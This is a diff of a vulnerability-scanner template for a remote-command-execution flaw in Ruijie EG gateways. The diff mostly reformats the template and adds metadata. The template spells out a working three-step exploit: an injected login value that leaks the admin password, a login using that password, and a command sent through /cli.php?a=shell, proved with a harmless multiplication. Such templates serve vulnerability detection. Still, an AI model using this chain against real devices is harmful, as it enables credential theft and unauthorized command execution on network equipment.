@@ -1,40 +1,45 @@
 id: ruijie-eg-cli-rce
 
 info:
-    name: ruijie-eg-cli-rce
-    author: Jarcis
-    severity: high
+  name: ruijie-eg-cli-rce
+  author: Jarcis
+  severity: high
+  verified: true
+  description: |-
+    ruijie eg cli rce
+  tags: ruijie,cli,rce
+  created: 2023/08/13
 
 set:
-    r1: randomInt(8000, 10000)
-    r2: randomInt(8000, 10000)
+  r1: randomInt(8000, 10000)
+  r2: randomInt(8000, 10000)
 rules:
-    r0:
-        request:
-            method: POST
-            path: /login.php
-            headers:
-                Content-Type: application/x-www-form-urlencoded
-            body: |
-                username=admin&password=admin?show+webmaster+user
-        expression: response.status == 200 && response.content_type.contains("text/json")
-        output:
-            search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
-            password: search["password"]
-    r1:
-        request:
-            method: POST
-            path: /login.php
-            headers:
-                Content-Type: application/x-www-form-urlencoded
-            body: |
-                username=admin&password={{password}}
-        expression: response.status == 200 && response.content_type.contains("text/json") && response.headers["set-cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
-    r2:
-        request:
-            method: POST
-            path: /cli.php?a=shell
-            body: |
-                notdelay=true&command=expr {{r1}} * {{r2}}
-        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+  r0:
+    request:
+      method: POST
+      path: /login.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        username=admin&password=admin?show+webmaster+user
+    expression: response.status == 200 && response.content_type.contains("text/json")
+    output:
+      search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
+      password: search["password"]
+  r1:
+    request:
+      method: POST
+      path: /login.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        username=admin&password={{password}}
+    expression: response.status == 200 && response.content_type.contains("text/json") && response.headers["set-cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
+  r2:
+    request:
+      method: POST
+      path: /cli.php?a=shell
+      body: |
+        notdelay=true&command=expr {{r1}} * {{r2}}
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
 expression: r0() && r1() && r2()
